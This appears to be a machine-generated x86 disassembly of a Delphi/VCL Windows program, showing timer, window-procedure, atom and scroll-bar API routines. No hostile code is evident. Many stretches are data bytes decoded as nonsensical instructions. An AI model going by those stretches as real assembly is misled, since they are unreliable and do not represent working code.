add al [ eax ]
add ah bl
scasb [ edi ]
inc eax
add [ eax ] bh
add [ eax ] al
add [ 0x6e695746 ] cl
outsd
ja r-xdata
add [ eax ] al
add al [ eax ]
pop es
inc ebp
outsb
popad
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ 0x78450800 ] al
je r-xdata
sbb ch dl
inc edx
popad
je r-xdata
bound ebp [ ebp + 0x64 ]
clc
adc [ eax ] al
xor al 0x0
add bh bh
in al 0x75
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
jbe r-xdata
popad
outsb
insb
add al [ gs : eax ]
add ah dl
inc esi
inc edx
add [ eax ] al
add [ eax ] al
or [ esi + 0x4f ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x272
add [ eax ] dl
inc eax
add [ eax ] cl
add [ eax ] al
or [ esi + 0x45 ] al
outsb
popad
bound ebp [ ebp + 0x64 ]
add al [ eax ]
add [ eax ] al
add al [ eax ]
dec ebp
jae r-xdata
add eax [ eax ]
add [ esi + 0x68 ] dl
aam 0x74
inc ebp
add al ch
xlat
push 0xfffffffe
dec [ ecx - 0x3974c7ba ]
jb r-xdata
je r-xdata
dec ecx
outsb
je r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
lodsb [ esi ]
jae r-xdata
add [ edi ] ah
add [ eax + 0x7004574 ] ah
add [ edx ] al
inc esp
jae r-xdata
add [ esi ] al
push esp
inc ecx
dec edi
ja r-xdata
add al [ eax ]
push es
add [ eax + eax + 0xb ] cl
add [ ebx + 0x4d004573 ] al
add bh bh
inc [ ecx ]
add al dh
dec [ esi + esi * 2 ]
inc ebp
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
test bl bl
je r-xdata
popad
insb
aam 0x46
inc edx
add [ eax ] al
add bh bh
hlt
add al [ eax ]
add ebp edi
insb
jae r-xdata
mov al 0x73
inc ebp
add [ edi ] al
push es
push esp
push esp
imul ebp [ ebp + 0x65 ] 0x45729872
add [ eax ] bl
aad 0x42
insb
add al [ eax ]
add [ eax ] bl
aad 0x42
add [ edx ] al
add [ esi ] al
add [ eax ] al
add [ ebx + edx * 2 ] al
sub al 0x3
add [ eax ] al
jb r-xdata
add [ edx ] al
add [ ebx ] al
adc dh [ ebp + eax * 2 ]
add al [ eax ]
add al [ eax ]
lea eax [ eax ]
inc eax
add [ eax ] cl
add bh bh
aam 0x75
inc ebp
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
call esp
jne r-xdata
add eax [ eax ]
or [ ecx + 0x6e ] cl
add [ eax ] al
add [ eax + 0x3e8 ] al
jns r-xdata
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
push esp
imul ebp [ ebp + 0x65 ] 0x3000372
int 0x73
inc ebp
add [ edx ] al
add [ ebx ] al
out dx eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
add al [ eax ]
add al [ eax ]
mov eax eax
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ ebx + esi * 2 + 0x45 ] ch
add al 0x53
sub_457450
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c14c
mov [ esi + 0x48 ] 0x1
mov [ esi + 0x34 ] 0x3e8
push esi
push sub_4574d4
call sub_43df58
mov [ esi + 0x38 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4574a0
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov [ esi + 0x48 ] 0x0
mov eax [ esi + 0x38 ]
call sub_43e00c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_4574d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call DefWindowProcW
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_45750e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xfff0
call sub_40587c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457548
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4575c7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x38 ]
push eax
call KillTimer
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4575ce
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x38 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_40a204
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4160ac
call sub_4060b0
sub_4577ec
push cs
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
add [ eax ] al
add [ eax - 0xfffdfc ] dh
jb r-xdata
add [ eax ] bh
je r-xdata
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
add [ eax ] al
push ebx
push esi
test dl dl
je r-xdata
adc al [ eax ]
add al 0x0
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
ja r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] al
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov al 0x4
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ edx ] al
cmovae ebp [ edi + 0x6e ]
jbe r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
jb r-xdata
add esp 0xc
add eax 0x0
imul ebp [ edi + 0x6e ] 0x73616c43
jae r-xdata
adc al [ eax ]
add al 0x0
add [ eax ] al
add cl [ ecx ]
inc ebp
js r-xdata
add [ eax + 0x12 ] al
inc eax
add [ eax + eax ] al
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_40898c
xor eax eax
push ebp
push sub_4578f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578fa
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
outsb
jae r-xdata
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
outsd
outsb
add al [ eax ]
add al [ eax ]
mov eax eax
mov al 0x4
add al [ eax ]
sub_4578a8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_40898c
xor eax eax
push ebp
push sub_4578f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4578fa
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_457904
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov eax [ ebp - 0x4 ]
call sub_40898c
xor eax eax
push ebp
push sub_45794f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457956
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_408928
retn
sub_457960
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov edx rw-data
xor ecx ecx
call sub_4307b0
mov eax [ edi ]
mov edx rw-data
xor ecx ecx
call sub_4307b0
mov eax [ edi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ edi ]
xor edx edx
mov [ edi ] edx
call sub_4055f0
inc ebx
xor esi esi
mov edx esi
mov eax [ edi ]
call sub_4305a0
mov edx [ r-xdata ]
call sub_4081e0
inc esi
dec ebx
jne r-xdata
sub_4579c0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_457a34
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a3b
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
call sub_457960
mov eax rw-data
mov edx [ r-xdata ]
call sub_407df0
mov eax rw-data
mov edx [ r-xdata ]
call sub_407df0
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_457a40
cwde
jpe r-xdata
push eax
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jge r-xdata
sub [ edi + 0x45 ] bh
add [ eax + eax * 4 ] ah
inc ebp
add ah ch
jle r-xdata
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi + edi * 2 + 0x139c0045 ] bl
inc ebx
add [ ebp + eax * 8 + 0x12cc0043 ] cl
inc ebx
add [ esi + eax * 8 - 0x3ad3ffbd ] al
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ esi + edi * 2 + 0x45 ] dl
add ah bh

pushfd
adc eax [ ebx ]
add al ah
jpe r-xdata
insb
add al [ gs : eax ]
add ah dl
mov [ r--data ] eax
add [ eax ] al
or eax [ esi + 0x52 ]
imul esi [ fs : edx + 0x65 ] 0x726f7463
add al [ eax ]
add al bh
adc [ eax ] al
inc esp
add [ eax ] al
add [ edi ] cl
inc esi
push esp
insd
jo r-xdata
add [ eax + 0x46 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] dh
add [ eax ] al
push es
inc esi
inc ebx
je r-xdata
mov ebp es
inc ebx
add ah cl
adc al [ ebx ]
add ch al
jpo r-xdata
add [ ecx ] cl
inc esi
push esp
popad
dec edi
xor eax [ edx + eax ]
add [ esi + eax * 2 + 0x42 ] bl
add [ eax ] bh
add [ eax ] al
add [ esi + eax * 2 ] cl
dec eax
insb
jo r-xdata
int3
add cl dh
jpo r-xdata
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x7d
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] bl
aad 0x42
add [ edx ] al
popad
je r-xdata
insd
jo r-xdata
add [ eax ] ah
add [ eax ] al
or [ esi + 0x54 ] eax
dec ebp
outsd
jne r-xdata
add [ ebx ] cl
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax ] dl
add [ eax ] al
pop es
je r-xdata
outsd
outsb
je r-xdata
test dh al
inc ebx
add [ eax * 8 - 0x396bffbd ] ch
inc ebx
add al ch
leave
add [ ecx ] dl
jl r-xdata
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
jb r-xdata
popad
add [ ebp + 0x7c ] dl
inc ebp
add [ ebp ] cl
add al [ eax ]
add [ eax ] al
add eax 0x457c1f00
add [ eax + eax + 0xb ] cl
outsb
inc ebx
insb
outsd
jae r-xdata
add al [ gs : eax ]
add ah dl
inc esi
inc edx
add [ eax ] cl
add [ eax ] al
or [ esi + 0x4f ] al
clc
jg r-xdata
arpl [ edx ] ax
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] bl
add [ edi ] cl
inc esi
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx * 2 + 0x6e ] si
jae r-xdata
inc esi
dec edi
outsb
push ebx
push 0x2776f
add ah ah
adc [ eax ] al
pop eax
add [ edi ] al
js r-xdata
inc ebx
add [ esi + eax * 8 - 0x3617ffbd ] dl
sub al 0xc5
add [ eax + eax ] ch
add [ eax - 0x53ffbd33 ] dh
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
pop es
outsb
je r-xdata
add [ edi ] ah
add [ esi + edi * 2 + 0x44070045 ] bl
jae r-xdata
add [ edx ] al
add [ ecx ] al
add [ edi * 2 + 0x45 ] bl
add al 0x53
insb
add al [ eax ]
add al [ eax ]
cmp al [ eax ]
adc al 0x7e
inc ebp
add [ edi ] al
inc ebp
js r-xdata
add [ esi ] al
inc ecx
dec edi
ja r-xdata
add [ eax ] dl
add [ ebp ] 0xe8
add [ ebp ] 0xfc
add [ ebp ] 0xd
push esp
inc ebx
outsd
insd
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x36676f
push esp
jle r-xdata
add [ ss : si + 0x7e ] dl
inc ebp
popad
outsb
arpl [ ebp + 0x2 ] sp
add [ eax ] al
enter 0x4011 0x0
pushad
add [ eax ] al
add [ eax ] al
add [ ebx ] cl
inc esi
inc esp
push di
outsb
push eax
jb r-xdata
add al [ eax ]
add ah bl
scasb [ edi ]
inc eax
add [ eax + eax ] bh
add [ eax ] al
pop es
inc esi
dec eax
popad
outsb
cwde
jpe r-xdata
outsb
add al [ fs : eax ]
add al [ eax ]
aas
add [ eax + 0x7f ] dl
inc ebp
add [ esi ] cl
inc esp
popa
jne r-xdata
jb r-xdata
jae r-xdata
insb
add al [ eax ]
arpl [ ebp + 0x74 ] si
add eax [ gs : eax ]
add [ eax ] dl
inc eax
add [ eax ] cl
add [ edx ] al
add [ edi * 2 + 0x45 ] bl
add al 0x53
or [ eax ] al
add [ eax ] eax
sbb al 0x7d
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
add [ esi ] al
inc ebx
jb r-xdata
inc eax
add [ eax ] cl
je r-xdata
popad
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x473676f
add [ eax ] al
adc [ eax ] al
xor al 0x0
add bh bh
xor al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add [ eax ] bl
add al [ eax ]
add eax 0x336c7443
inc esp
pop esp
inc esi
add [ ecx ] 0x0
add [ eax ] al
je r-xdata
popad
jb r-xdata
jns r-xdata
je r-xdata
popad
add al [ gs : bx + si ]
add al [ eax ]
and [ ebp + 0x45 ] bh
add [ edi ] al
or eax 0x6d6f4354
insd
outsd
outsb
inc esp
imul esp [ ecx + 0x6c ] 0x7a98676f
inc ebp
add ah bl
scasb [ edi ]
inc eax
add [ ecx ] al
add [ ecx ] cl
push eax
add al [ eax ]
add [ edi ] al
inc ebp
js r-xdata
dec edi
outsd
outsb
je r-xdata
aad 0x42
add [ esi ] al
add [ edi ] al
popad
outsb
insb
jb r-xdata
add [ eax ] al
insb
add al [ eax ]
add al [ eax ]
daa
add ah ch
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add [ edi * 2 + 0x45 ] bl
add al 0x53
inc ebx
je r-xdata
inc esi
dec eax
arpl [ ebp + 0x74 ] si
add eax [ gs : eax ]
add [ eax ] dl
cli
dec [ ebp - 0x4b5effc0 ]
add [ edx ] al
add [ ebx ] al
inc ebx
jge r-xdata
jge r-xdata
js r-xdata
add [ eax ] al
or [ eax ] al
add al [ eax ]
sbb al 0x7d
inc ebp
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ edi ] al
dec ebp
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ edx ] al
add [ edi * 2 + 0x45 ] bl
add al 0x53
add [ edx ] al
jge r-xdata
inc edx
add [ eax ] bh
add [ eax ] al
xor eax [ esp + ebx * 2 + 0x46 ]
outsb
insb
jmp r-xdata
outsb
push ebx
push 0x5776f
add dh bl
jge r-xdata
aam 0x46
inc edx
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060005 ] al
call sub_43c14c
mov [ esi + 0x34 ] 0x1
push esi
push sub_457f88
call sub_43ddc0
mov [ esi + 0x5c ] eax
mov eax esi
test bl bl
je r-xdata
add [ ebx - 0x2c478000 ] cl
add [ eax ] al
add [ eax ] al
je r-xdata
loope r-xdata
add [ edx ] al
add [ ebx ] al
arpl [ ebp + 0x45 ] di
add [ edx ] al
add [ ebx ] al
mov [ ebp + 0x45 ] edi
add [ edx ] al
add [ ebx ] al
stosd [ edi ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
add [ edx ] al
add [ edx ] al
add ah bl
scasb [ edi ]
inc eax
add [ eax + eax ] bh
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070004 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
aam 0x46
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x170 ]
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a20ec
retn
mov eax 0xd2
jmp sub_4067e0
call [ rw-data ]
sub_457e1c
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x170 ]
retn
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a20ec
retn
sub_457e54
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43c14c
mov [ esi + 0x34 ] 0x1
push esi
push sub_457f88
call sub_43ddc0
mov [ esi + 0x5c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_457e9c
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
call sub_43de58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c198
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x270 ] edx
lea eax [ esi + 0x40 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_457eec
push esi
mov esi eax
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0xd0 ] 0x0
je r-xdata
call sub_457e1c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a20a0
test eax eax
jne r-xdata
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
pop esi
retn
call sub_457e1c
jmp r-xdata
sub_457f28
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_4a0f40
mov cl 0x1
sub_457f50
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_4058cc
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x58 ]
push eax
call CallWindowProcW
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_457f88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_457fb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_458024
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a20a0
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x4 ]
call sub_4941f8
mov [ ebp - 0x18 ] eax
call sub_49404c
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_4580d6
push [ fs : ecx ]
mov [ fs : ecx ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_458095
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push ebx
call esi
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45809c
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_45809c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4580dd
mov eax [ ebp - 0x18 ]
call sub_4942bc
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x14 ]
call sub_494054
mov eax [ ebp - 0x8 ]
add eax 0x40
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4055f0
retn
sub_458234
add esp 0xffffffb0
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageW
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x4c ] eax
mov [ esp + 0x50 ] 0x0
lea ecx [ esp + 0x44 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_41296c
push eax
call GlobalAddAtomW
mov [ rw-data ] ax
add esp 0x50
retn
sub_45838e
dec edx
add [ eax ] ch
jecxz r-xdata
dec ebx
add [ ebp + 0x2c ] dh
add [ eax ] al
add [ eax ] al
add al bh
fmul [ edx ]
and bh bl
dec edx
add [ eax ] al
add [ eax ] al
add ah dh
fmul [ edx ]
test dl ah
dec edx
add [ eax ] al
add [ eax ] al
add al dh
fmul [ edx ]
shl dl 0x1
dec edx
add [ eax ] al
add [ eax ] al
add ah ch
fmul [ edx ]
mov eax 0x4ae0
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_45841b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_407e40
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458422
retn
cmp [ rw-data ] 0x0
je r-xdata
sub_458428
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebp + 0x45 ] al
add [ eax ] al
aam 0x84
inc ebp
add [ eax ] al
add [ eax ] al
add al ah
test [ ebp ] al
movsb [ edi ] [ esi ]
add [ eax ] al
add ah bh
mov eax 0x56ac0048
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
sub_458574
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_48c7e0
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_4585b0
push ebx
push esi
push r-xdata
call GetModuleHandleW
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call sub_40bb70
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call sub_40bb70
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_459000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al [ 0x7c004590 ]
cdq
inc ebp
add [ edx - 0x7dffba70 ] bh
xchg ebx eax
inc ebp
add [ esi - 0x6c ] dl
inc ebp
add [ edx - 0x4bffba6c ] al
add [ eax ] al
add [ eax - 0x53ffbd33 ] dh
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
sub_459036
inc ebx
add al dl
pop eax
inc eax
add al ah
rol [ ebx ] 0xd8
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esp + edi * 4 ] ah
inc ebp
add [ eax + edi * 8 + 0x45 ] cl
add ah bl
retn 0x45
sub_45905d
adc al [ ebx ]
adc al 0xc1
inc ebp
add al cl
clc
inc ebp
add [ esi + eax * 8 - 0x3617ffbd ] dl
inc ebx
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax - 0x3ffba45 ] ah

sub_459086
inc ebx
add [ ebp - 0x3a23ffbb ] bl
inc ebp
add [ eax - 0x57ffba15 ] dh
inc ebp
add [ eax - 0xf ] bl
inc ebp
add [ edx + esi * 8 + 0xe0045 ] bl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
inc eax
adc al [ eax ]
xor al 0x0
add [ eax ] al
inc eax
adc al [ eax ]
pop eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
add [ eax ] al
inc eax
adc al [ eax ]
xor al 0x0
add [ eax ] al
or [ esi + 0x43 ] al
popad
jo r-xdata
outsb
add al [ eax ]
add [ eax ] al
adc [ eax ] al
cmp eax 0xa000000
inc esi
push edx
popad
imul ebp [ fs : edi + 0x49 ] 0x26d6574
add [ eax ] al
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
add [ eax ] cl
inc esi
push esi
imul esi [ ebx + 0x69 ] 0x2656c62
add [ eax ] al
mov ah 0x10
inc eax
add [ edi ] bh
add [ eax ] al
add [ ebx ] cl
inc esi
inc edi
imul ebp [ edi + 0x6e ] 0x2
adc [ eax ] al
cmp [ eax ] al
add [ eax ] al
or [ esi + 0x43 ] al
push 0x656b6365
add al [ fs : eax ]
add [ eax ] al
adc [ eax ] al
cmp [ eax ] eax
add [ eax ] al
or [ esi + 0x45 ] al
outsb
popad
bound ebp [ ebp + 0x64 ]
add al [ eax ]
